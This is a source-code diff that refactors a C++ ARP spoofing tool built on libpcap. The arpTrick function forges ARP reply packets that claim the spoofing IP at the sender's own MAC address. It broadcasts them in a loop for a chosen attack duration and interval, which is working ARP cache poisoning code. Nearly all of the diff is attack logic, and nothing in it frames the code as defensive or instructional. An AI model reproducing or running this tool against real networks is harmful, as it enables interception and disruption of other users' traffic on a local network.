@@ -21,6 +21,7 @@ using namespace std;
 typedef unsigned char byte;
 
 #define ETHER_ADDR_LEN 6
+#define IPV4_ADDR_LEN 4
 
 static void sleep_ms(unsigned int secs)
 {
@@ -32,22 +33,21 @@ static void sleep_ms(unsigned int secs)
 
 struct arpPacket
 {
-    //TODO: typedef unsigned char byte
-    byte dstMacAddr[6];
-    byte srcMacAddr[6];
-    unsigned char type[2];
-    unsigned char hwtype[2];
-    unsigned char ip[2];
-    unsigned char length;
-    unsigned char length2;
-    unsigned char sourceMacAddressInsidePacket[6];
-    unsigned char sourceIpAddress[4];
-    unsigned char targetMacAddressInsidePacket[6];
-    unsigned char targetIpAddress[6];
+    /* Ether header. */
+    byte ether_dhost[6];
+    byte ether_shost[6];
+    byte type[2];
+    /* Arp field .   */
+    byte arp_hwtype[2];
+    byte arp_pro[2];
+    byte arp_hlen[1];
+    byte arp_plen[1];
+    byte arp_op[2];
+    byte arp_sha[6];
+    byte arp_spa[4];
+    byte arp_tha[6];
+    byte arp_tpa[4];
 };
-
-static byte dstMacAddr[ETHER_ADDR_LEN]={0xff,0xff,0xff,0xff,0xff,0xff};
-static byte srcMacAddr[ETHER_ADDR_LEN];
 
 #define NORETURN __attribute__ ((__noreturn__))
 
@@ -62,7 +62,7 @@ void output_error_msg_and_exit(const char* msg,int errorCode)
 /* Get mac address by name and return an array of 
    byte. The size of the array is ETHER_ADDR_LEN. 
    Remember to free the memory returned.        */
-char* get_mac_address(char* deviceName)
+byte* get_mac_address(char* deviceName)
 {
     ifreq ifr;
     int skfd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -72,18 +72,45 @@ char* get_mac_address(char* deviceName)
 	output_error_msg_and_exit("error in ioctl with cmd SIOCGIFHWADDR.",0);
     }
     close(skfd);
-    char *macAddr = (char*)malloc(6*sizeof(byte));
+    byte *macAddr = (byte*)malloc(6*sizeof(byte));
     memcpy(macAddr,ifr.ifr_hwaddr.sa_data,ETHER_ADDR_LEN);
     return macAddr;
 }
 
-void print_macAddr(char* macAddr)
+void print_macAddr(byte* macAddr)
 {
     printf("macAddr");
-    for(int i=0x6;i<=0xb;i++)
+    for(int i=0;i<6;i++)
     {
-	printf("%02x",(unsigned char)macAddr[i-0x6]);
+	printf("%02x",(byte)macAddr[i]);
     }
+}
+void print_ipv4Addr(byte* ipv4Addr)
+{
+    printf("ipv4Addr");
+    for(int i=0;i<4;i++)
+    {
+	printf("%02x",(byte)ipv4Addr[i]);
+    }
+}
+
+void print_arp_packet(byte* packet)
+{
+    for(int i=0x0;i<0x10;i++)
+    {
+	printf("%02x",packet[i]);
+    }
+    cout<<endl;
+    for(int i=0x10;i<0x20;i++)
+    {
+	printf("%02x",packet[i]);
+    }
+    cout<<endl;
+    for(int i=0x20;i<0x2a;i++)
+    {
+	printf("%02x",packet[i]);
+    }
+    cout<<endl;
 }
 
 /* TODO: still not completed. */
@@ -111,110 +138,122 @@ int check_timeUnit_and_calculate_totalTime(int attackTime,const char* timeUnit)
     return totalTime;
 }
 
-/* #define ETHER_ADDR_LEN 6 */
-/*{
-    char* dstAddr = get_mac_address(deviceName);
-    set_ether_header_for_packet(packet,dstAddr,srcAddr);
-    free(dstAddr);
-    set_
-    memcpy(packet->)
-}*/
-void set_ether_header_for_packet(arpPacket* packet,char* dstMacAddr,char* srcMacAddr)
+void set_ether_header_for_packet(arpPacket* packet,byte* dstMacAddr,byte* srcMacAddr)
 {
-    memcpy(packet->dstMacAddr,dstMacAddr,ETHER_ADDR_LEN);
-    memcpy(packet->srcMacAddr,srcMacAddr,ETHER_ADDR_LEN);
-    //ether_type
+    memcpy(packet->ether_dhost,dstMacAddr,ETHER_ADDR_LEN);
+    memcpy(packet->ether_shost,srcMacAddr,ETHER_ADDR_LEN);
+    packet->type[0]=0x08;
+    packet->type[1]=0x06;
 }
-//void arpTrick(int argc,char *argv[]);
-void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,int intervalTime)
+
+byte* ipv4String_to_byteArray_with_validity_check(char* ipAddr)
 {
-    /*Total packets sent.*/
-    int totalPackets =0;
-
-    /*Packet to sent.*/
-    unsigned char packet[42];/*byte*/
-    
-    /*check the validity of timeUnit & calculate totaltime*/ 
-    int totalTime = check_timeUnit_and_calculate_totalTime(attackTime,timeUnit);
-
-    /*Check the validity of ip address*/
+    cout<<"Checking the validity of tricked ip address."<<endl;
     if(is_IPAddress_valid(ipAddr))
     {
-	cout<<"Checking the validity of tricked ip address."<<endl;
-	const char * split = "."; 
-	char * p;
-	int tag=0x26;
+	byte* ip = (byte*)malloc(IPV4_ADDR_LEN*sizeof(byte));
+	const char* split = "."; 
+	char* p;
 	p = strtok (ipAddr,split);
-	packet[tag]=atoi(p);
-	tag++;
-	/*This loop can not work alone. It doesn't check the 
-	  validity of ip address. Use is_IPAddress_valid(char*) 
-	  to check the validity in advance.                   
-	  It supposed that the ip is valid and cast it into 4
-	  hexadecimal integers.                              */	
-	while(p!=NULL)
-	{
-	    p=strtok(NULL,split);
-	    if(p!=NULL)
-		{
-		    packet[tag]=atoi(p);
-		}
-	    tag++;
-	}
-    }
-    else
-    {
-	cout<<"ip address format error. [xx.xx.xx.xx]"<<endl;
-	return;
-    }
-
-    /*Check the validity of spoofing ip address*/
-    if(is_IPAddress_valid(spoofingIP))
-    {
-	const char * split = "."; 
-	char * p;
-	int tag=0x1c;
-	p = strtok (ipAddr,split);
-	packet[tag]=atoi(p);
+	int tag=0;
+	ip[tag]=atoi(p);
 	tag++;
 	while(p!=NULL)
 	{
 	    p=strtok(NULL,split);
 	    if(p!=NULL)
 		{
-		    packet[tag]=atoi(p);
+		    ip[tag]=atoi(p);
 		}
 	    tag++;
 	}
+	return ip;
     }
     else
     {
-	cout<<"spoofing ip address format error. [xx.xx.xx.xx]"<<endl;
-	return;
+	//TODO:errorCode
+	output_error_msg_and_exit("ip address format error. [xx.xx.xx.xx]",0);
     }
+    
+}
 
-    char errBuf[PCAP_ERRBUF_SIZE];
-    char * deviceName;  
-    /*look for suitable device.*/
+char* pcap_lookupdev_with_prompts(char* errBuf)
+{
+    char* deviceName;
     cout<<"Looking for suitable device...";
     deviceName = pcap_lookupdev(errBuf);
-    
     if(deviceName)//success 
     {  
 	cout<<"done.  device:"<<deviceName<<endl;
     }
     else          //fail
     {
-	cout<<"error. "<<errBuf<<endl;
-        return ;
+	//TODO: errorCode.
+	output_error_msg_and_exit(errBuf,0);
     }
-    char* temp = get_mac_address(deviceName);
-    for(int i=0;i<6;i++)
-    {
-	printf("%02x",(unsigned char)temp[i]);
-	//cout<<hex<<(unsigned char)temp[i]<<endl;
-    }
+    return deviceName;
+}
+
+
+
+//void arpTrick(int argc,char *argv[]);
+void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,int intervalTime)
+{
+    char errBuf[PCAP_ERRBUF_SIZE];
+    char * deviceName;
+
+    /* Total packets sent. */
+    int totalPackets =0;
+    
+    /* Check the validity of timeUnit & calculate totaltime. */ 
+    int totalTime = check_timeUnit_and_calculate_totalTime(attackTime,timeUnit);
+
+    /* Packet to sent. */
+    arpPacket *packet = (arpPacket*)malloc(sizeof(arpPacket));
+
+    /* Looking for suitable device. */
+    deviceName = pcap_lookupdev_with_prompts(errBuf);
+
+    /* Set ether header. */
+    byte dstMacAddr[ETHER_ADDR_LEN]={0xff,0xff,0xff,0xff,0xff,0xff};
+    byte* srcMacAddr = get_mac_address(deviceName);
+    set_ether_header_for_packet(packet,dstMacAddr,srcMacAddr);
+    free(srcMacAddr);
+
+    /* Set hardware type for packet. */
+    packet->arp_hwtype[0]=0x00;
+    packet->arp_hwtype[1]=0x01;
+
+    /* Set protocol type for packet. */
+    packet->arp_pro[0]=0x08;
+    packet->arp_pro[1]=0x00;
+    /* Set hardware length for packet. */
+    packet->arp_hlen[0]=0x06;
+    /* Set protocol addr length. */
+    packet->arp_plen[0]=0x04;
+    /* Set op code. */
+    packet->arp_op[0]=0x00;
+    packet->arp_op[1]=0x02;
+
+    /* Set source mac for packet. */
+    byte* sha = get_mac_address(deviceName);
+    memcpy(packet->arp_sha,sha,ETHER_ADDR_LEN);
+    free(sha);
+
+    /* Set source ip address for packet. */
+    byte* sourceIP = ipv4String_to_byteArray_with_validity_check(spoofingIP);
+    memcpy(packet->arp_spa,sourceIP,IPV4_ADDR_LEN);
+    free(sourceIP);
+
+    /* Do not need to set target mac, let it be 0. */
+
+    /* Set target ip address for packet. */
+    byte* targetIP = ipv4String_to_byteArray_with_validity_check(ipAddr);
+    memcpy(packet->arp_tpa,targetIP,IPV4_ADDR_LEN);
+    free(targetIP);
+
     /*open the device by name*/
+    //pcap_t *fp = pcap_open_live_with_prompts();
     cout<<"Opening the device...";
     pcap_t *fp;
     if((fp=pcap_open_live(
@@ -225,113 +264,21 @@ void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,
 	errBuf
 	))==NULL)
     {
+	//TODO:encapuslate
+	output_error_msg_and_exit("error. unable to open the adaper.",0);
 	cout<<"error. unable to open the adaper."<<endl;
 	cout<<errBuf<<endl;
 	cout<<"try sudo ArpCal [-a]."<<endl;
 	return;
     }
-
     cout<<"done."<<endl;
 
-    /*set mac addr for packet*/
-    //set_srcmac_for_packet();
-    //TODO:encapsulate
-    cout<<"deviceName"<<deviceName<<endl;
-    ifreq ifr;
-    char *ifname = deviceName;
-    int skfd = socket(AF_INET, SOCK_DGRAM, 0);
-    strncpy(ifr.ifr_name, ifname, 16/*IFNameSzie*/);
-    if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) {
-	close(skfd);
-	return;
-    }
-    strncpy(ifr.ifr_name, ifname, 16);
-    if (ioctl(skfd, SIOCGIFHWADDR, &ifr) >= 0)//success
-    {/*do nothing*/}
-	//memcpy(ife->hwaddr, ifr.ifr_hwaddr.sa_data, 8);
-    cout<<"ife->hwaddr:";
-    for(int i=0x6;i<=0xb;i++)
-    {
-	packet[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x6];
-	printf("%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x6]);
-    }
-    for(int i=0x16;i<=0x1b;i++)
-    {
-	packet[i]=(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x16];
-	printf("%02x",(unsigned char)ifr.ifr_hwaddr.sa_data[i-0x16]);
-    }
+    cout<<"packet:"<<endl;
+    byte* p;
+    p = (unsigned char*)packet;
+    print_arp_packet(p);
 
-    /* set target mac address */
-    packet[0x0] = 0xff;
-    packet[0x1] = 0xff;
-    packet[0x2] = 0xff;
-    packet[0x3] = 0xff;
-    packet[0x4] = 0xff;
-    packet[0x5] = 0xff;
-
-    /* set mac source */
-    /*
-    packet[0x6] = 0x14;
-    packet[0x7] = 0x2d;
-    packet[0x8] = 0x27;
-    packet[0x9] = 0xee;
-    packet[0xa] = 0x29;
-    packet[0xb] = 0xd7;*/
-
-    /* set arp type */
-    packet[0xc] = 0x08;
-    packet[0xd] = 0x06;
-    /* set hardware type */
-    packet[0xe] = 0x00;
-    packet[0xf] = 0x01;
-
-    packet[0x10] = 0x08;
-    packet[0x11] = 0x00;
-    packet[0x12] = 0x06;
-    packet[0x13] = 0x04;
-    packet[0x14] = 0x00;
-    packet[0x15] = 0x02;
-   
-    //src mac
-    /*
-    packet[0x16] = 0x14;
-    packet[0x17] = 0x2d;
-    packet[0x18] = 0x27;
-    packet[0x19] = 0xee;
-    packet[0x1a] = 0x29;
-    packet[0x1b] = 0xd7;*/
-
-    //src ip
-    packet[0x1c] = 0xc0;
-    packet[0x1d] = 0xa8;
-    packet[0x1e] = 0x01;
-    packet[0x1f] = 0x01;
-    //target mac. do not need to fill in this situation.
-    //let them all be 0.
-    packet[0x20] = 0x00;
-    packet[0x21] = 0x00;
-    packet[0x22] = 0x00;
-    packet[0x23] = 0x00;
-    packet[0x24] = 0x00;
-    packet[0x25] = 0x00;
-    //target ip
-    /*
-    packet[0x26] = 0xff;
-    packet[0x27] = 0xff;
-    packet[0x28] = 0xff;
-    packet[0x29] = 0xff;
-    */
-
-
-    arpPacket *pa;
-    pa=(arpPacket*)&packet;
-    for(int x=0;x<6;x++)
-    {
-	cout<<hex<<(int)pa->dstMacAddr[x]<<endl;
-    }
-
-
-    if(!pcap_sendpacket(fp,packet,42/*size*/))
+    if(!pcap_sendpacket(fp,p,42/*size*/))
     {
 	cout<<"Start senting down packet."<<endl;
     }
@@ -342,12 +289,12 @@ void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,
     }
 
     const time_t start_time = time(NULL); /*get start time*/
-    //cout<<start_time<<endl;
     
     while(true)
     {
 	sleep_ms(intervalTime);
-	pcap_sendpacket(fp,packet,42/*size*/);
+	//TODO: p=packet
+	pcap_sendpacket(fp,p,42/*size*/);
 	totalPackets++;
 	const time_t mid_time = time(NULL);
 	cout<<dec<<totalTime-(mid_time-start_time)<<" "<<flush;/*Flush output buffer.*/
@@ -357,7 +304,6 @@ void arpTrick(char* ipAddr,char* spoofingIP,int attackTime,const char* timeUnit,
     }
 
     const time_t end_time = time(NULL);   /*get end time*/
-    //cout<<end_time<<endl;
     /*Close the device*/
     pcap_close(fp);
     cout<<"Work done, closing the devcie...done."<<endl;
